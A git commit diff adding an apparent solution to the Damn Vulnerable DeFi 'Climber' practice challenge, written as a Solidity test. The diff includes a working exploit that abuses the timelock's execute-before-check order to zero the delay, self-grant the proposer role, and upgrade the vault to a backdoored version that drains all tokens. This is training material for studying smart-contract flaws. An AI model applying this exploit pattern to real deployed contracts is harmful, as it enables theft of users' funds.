17258f069ad0577f18d2982c5f7f3bcdc4bfac7f
Tanu Gupta <guptatanukhandelwal.96@gmail.com>
2025-07-10 02:04:46 +0530

    fix: findings report

--- test/climber/Climber.t.sol
+++ test/climber/Climber.t.sol
@@ -7,6 +7,90 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "src/climber/ClimberErrors.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {AccessControl} from "../../src/climber/ClimberTimelockBase.sol";
+import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "../../src/climber/ClimberConstants.sol";
+
+
+contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    modifier onlySweeper() {
+        if (msg.sender != _sweeper) {
+            revert CallerNotSweeper();
+        }
+        _;
+    }
+
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+        _disableInitializers();
+    }
+
+    function initialize(address admin, address proposer, address sweeper) external initializer {
+        // Initialize inheritance chain
+        __Ownable_init(msg.sender);
+        __UUPSUpgradeable_init();
+
+        // Deploy timelock and transfer ownership to it
+        transferOwnership(address(new ClimberTimelock(admin, proposer)));
+
+        _setSweeper(sweeper);
+        _updateLastWithdrawalTimestamp(block.timestamp);
+    }
+
+    // Allows the owner to send a limited amount of tokens to a recipient every now and then
+    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {
+        if (amount > WITHDRAWAL_LIMIT) {
+            revert InvalidWithdrawalAmount();
+        }
+
+        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
+            revert InvalidWithdrawalTime();
+        }
+
+        _updateLastWithdrawalTimestamp(block.timestamp);
+
+        SafeTransferLib.safeTransfer(token, recipient, amount);
+    }
+
+    // Allows trusted sweeper account to retrieve any tokens
+    function sweepFunds(address token) external onlySweeper {
+        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
+    }
+
+    function getSweeper() external view returns (address) {
+        return _sweeper;
+    }
+
+    function _setSweeper(address newSweeper) private {
+        _sweeper = newSweeper;
+    }
+
+    function getLastWithdrawalTimestamp() external view returns (uint256) {
+        return _lastWithdrawalTimestamp;
+    }
+
+    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
+        _lastWithdrawalTimestamp = timestamp;
+    }
+
+    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
+    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
+
+    function moveFunds(address token, uint256 amount, address recovery) external {
+        IERC20(token).transfer(recovery, amount);
+    }
+}
+    // function version() external pure returns (uint256) {
+    //     return 2;
+    // }
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -84,7 +168,38 @@ contract ClimberChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_climber() public checkSolvedByPlayer {}
+    function test_climber() public checkSolvedByPlayer {
+        ClimberVaultV2 vaultV2 = new ClimberVaultV2();
+
+        HelperContract helper = new HelperContract(timelock);
+
+        bytes memory data =
+            abi.encodeCall(ClimberVaultV2.moveFunds, (address(token), VAULT_TOKEN_BALANCE, recovery));
+
+        address[] memory scheduleTargets = new address[](4);
+        uint256[] memory scheduleValues = new uint256[](4);
+        bytes[] memory scheduleDataElements = new bytes[](4);
+         
+        scheduleTargets[0] = address(timelock);
+        scheduleValues[0] = 0;
+        scheduleDataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
+
+        scheduleTargets[1] = address(timelock);
+        scheduleValues[1] = 0;
+        scheduleDataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(helper)));
+
+        scheduleTargets[2] = address(vault);
+        scheduleValues[2] = 0;
+        scheduleDataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(vaultV2), data));
+        
+        scheduleTargets[3] = address(helper);
+        scheduleValues[3] = 0;
+        scheduleDataElements[3] = abi.encodeCall(HelperContract.callSchedule, ());
+        
+        helper.setSchedule(scheduleTargets, scheduleDataElements);
+        
+        timelock.execute(scheduleTargets, scheduleValues, scheduleDataElements, 0);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -92,5 +207,24 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract HelperContract {
+    address[] private s_targets;
+    bytes[] private s_dataElements;
+    ClimberTimelock immutable i_timelock ;
+
+    constructor(ClimberTimelock timelock){
+        i_timelock = timelock;
+    }
+    
+    function setSchedule(address[] memory _targets, bytes[] memory _dataElements)external {
+        s_targets = _targets;
+        s_dataElements = _dataElements;
+    }
+    function callSchedule() external {
+        uint256[] memory _values = new uint256[](s_targets.length);
+        i_timelock.schedule(s_targets, _values, s_dataElements, 0);
     }
 }
